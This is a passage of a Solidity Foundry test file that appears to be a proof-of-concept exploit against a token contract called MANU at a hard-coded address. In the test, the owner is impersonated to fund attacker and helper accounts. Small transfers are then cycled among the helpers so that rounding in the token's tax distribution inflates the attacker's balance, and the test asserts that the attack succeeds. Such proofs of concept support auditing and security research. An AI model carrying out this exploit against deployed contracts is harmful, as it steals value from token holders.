    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function owner() external view returns (address);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x16bE19fB70F902EcF39b54aD988eE427cB1b6848;
    address attacker = address(this);

    // Helper addresses
    address helper1 = address(0x111);
    address helper2 = address(0x222);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Label addresses for debugging
        vm.label(helper1, "Helper1");
        vm.label(helper2, "Helper2");

        // Get initial tokens for attacker by impersonating owner
        address owner = MANU(TARGET).owner();
        vm.startPrank(owner);

        // Transfer some tokens to attacker to start
        uint256 initialAmount = 1000 * 10**18;
        MANU(TARGET).transfer(attacker, initialAmount);

        // Also transfer small amounts to helpers to make them holders
        MANU(TARGET).transfer(helper1, 100 * 10**18);
        MANU(TARGET).transfer(helper2, 100 * 10**18);

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = MANU(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);
        console.log("Initial total supply:", MANU(TARGET).totalSupply());

        // Create 3 helper accounts
        address helper1 = address(0x111);
        address helper2 = address(0x222);
        address helper3 = address(0x333);

        vm.label(helper1, "Helper1");
        vm.label(helper2, "Helper2");
        vm.label(helper3, "Helper3");

        // Distribute tokens to all helpers to make them holders
        // Need enough tokens so they can transfer between each other
        uint256 helperAmount = 100 * 10**18;

        MANU(TARGET).transfer(helper1, helperAmount);
        MANU(TARGET).transfer(helper2, helperAmount);
        MANU(TARGET).transfer(helper3, helperAmount);

        console.log("After distribution - attacker balance:", MANU(TARGET).balanceOf(attacker));
        console.log("Helper1 balance:", MANU(TARGET).balanceOf(helper1));
        console.log("Helper2 balance:", MANU(TARGET).balanceOf(helper2));
        console.log("Helper3 balance:", MANU(TARGET).balanceOf(helper3));

        // Now perform transfers ONLY between helper accounts
        // Attacker is not involved in these transfers but is a holder
        // Each transfer will distribute tax to attacker (and other holders)

        // Perform multiple small transfers to maximize rounding exploitation
        uint256 smallAmount = 1 * 10**18;

        for (uint256 i = 0; i < 5; i++) {
            // Transfer from helper1 to helper2
            vm.prank(helper1);
            MANU(TARGET).transfer(helper2, smallAmount);

            // Transfer from helper2 to helper3
            vm.prank(helper2);
            MANU(TARGET).transfer(helper3, smallAmount);

            // Transfer from helper3 to helper1
            vm.prank(helper3);
            MANU(TARGET).transfer(helper1, smallAmount);
        }

        // Check final balance
        uint256 finalBalance = MANU(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);
        console.log("Final total supply:", MANU(TARGET).totalSupply());

        // Verify attack succeeded
        assertGt(finalBalance, initialBalance, "Attacker balance should increase from tax distribution");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

